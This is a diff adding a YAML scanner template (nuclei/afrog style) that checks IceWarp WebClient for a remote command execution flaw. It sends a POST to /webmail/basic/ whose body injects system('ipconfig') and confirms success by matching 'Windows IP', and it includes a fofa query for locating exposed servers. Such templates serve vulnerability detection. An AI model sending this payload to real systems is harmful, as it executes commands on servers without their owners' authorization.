@@ -1,0 +1,32 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: |
+      _dlg[captcha][target]=system(\'ipconfig\')\
+    headers:
+      Cookie: use_cookies=1
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - Windows IP
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/webmail/basic/'
+id: icewarp-webclient-basic-rce
+info:
+  author: daffainfo
+  description: |-
+    IceWarp WebClient 存在远程命令执行漏洞，攻击者构造特殊的请求即可远程命令执行
+    fofa: app="IceWarp-公司产品"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: IceWarp WebClient basic 远程命令执行漏洞
+  severity: critical
+  tags: icewarp,webclient,basic,rce,argus-import
